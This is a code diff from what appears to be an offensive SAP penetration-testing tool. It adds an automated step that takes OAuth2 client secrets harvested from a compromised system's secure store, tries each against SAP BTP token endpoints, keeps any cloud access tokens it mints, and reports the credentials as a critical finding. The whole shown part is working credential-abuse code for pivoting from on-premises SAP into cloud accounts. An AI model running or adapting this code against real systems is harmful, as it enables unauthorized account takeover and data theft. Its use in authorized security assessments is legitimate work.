@@ -14108,6 +14108,84 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 import traceback
                 print(f"[-] SecStore {sid}: {e}")
                 traceback.print_exc()
+                return
+
+            # --- OA2C auto-test: if SecStore yielded any oauth2_client
+            # entries, refresh OA2C profiles, pair them, and auto-test
+            # each candidate by attempting a BTP token mint. -----------
+            oa2c_entries = [
+                r for r in (node.secstore_entries or [])
+                if r.get("category") == "oauth2_client"
+                   and r.get("password")]
+            if not oa2c_entries:
+                return
+            print(f"[*] SecStore {sid}: {len(oa2c_entries)} OA2C "
+                  f"client_secret(s) found — auto-testing BTP "
+                  f"token mint …")
+            try:
+                from sap_oa2c import read_oa2c_profiles
+                from sap_onprem_to_btp import (
+                    harvest_btp_candidates, mint_btp_token)
+                from sap_btp import extract_region_from_token
+                if not (node.oauth2_profiles or []):
+                    profiles = read_oa2c_profiles(
+                        node, soap_session=soap_session)
+                    node.oauth2_profiles = profiles
+                    print(f"[*] SecStore {sid}: OA2C implicit refresh "
+                          f"→ {len(profiles)} profile(s)")
+                candidates = harvest_btp_candidates(api.state, node)
+                oa2c_cands = [
+                    c for c in candidates
+                    if c.get("source") == "abap-oa2c"]
+                if not oa2c_cands:
+                    print(f"[*] SecStore {sid}: no OA2C candidates "
+                          f"matched — profiles may lack BTP-bound "
+                          f"token_endpoint")
+                    return
+                prof_by_cid = {
+                    p["client_id"]: p
+                    for p in (node.oauth2_profiles or [])
+                    if p.get("client_id")}
+                results = []
+                for c in oa2c_cands:
+                    uaa = c.get("uaa_url", "")
+                    cid = c.get("client_id", "")
+                    secret = c.get("client_secret", "")
+                    prof = prof_by_cid.get(cid, {})
+                    cuuid = prof.get("client_uuid", "")
+                    if not (uaa and cid and secret):
+                        continue
+                    token, err = mint_btp_token(uaa, cid, secret)
+                    valid = bool(token)
+                    rec = {
+                        "client_uuid": cuuid,
+                        "client_id": cid,
+                        "token_endpoint": uaa,
+                        "valid": valid,
+                        "error": err,
+                    }
+                    results.append(rec)
+                    if valid:
+                        region = extract_region_from_token(token) or ""
+                        api.btp_tokens[region] = token
+                        print(f"[+] SecStore {sid}: OA2C auto-test "
+                              f"OK — {cid} → token minted "
+                              f"(region={region or '?'})")
+                    else:
+                        print(f"[-] SecStore {sid}: OA2C auto-test "
+                              f"FAIL — {cid} → {err}")
+                node.oa2c_test_results = results
+                n_valid = sum(1 for r in results if r["valid"])
+                if n_valid:
+                    sapmap_findings.emit_finding(
+                        "CRITICAL", sid,
+                        f"OA2C client_secret validated — "
+                        f"{n_valid}/{len(results)} BTP token(s) "
+                        f"minted successfully",
+                        attack_capability="creds.oa2c_secrets")
+            except Exception as e:
+                print(f"[-] SecStore {sid}: OA2C auto-test error "
+                      f"— {e}")
 
         _bg(f"{sid}:download_secstore", "Download SecStore", _run)
         return json.dumps({"status": "started"})
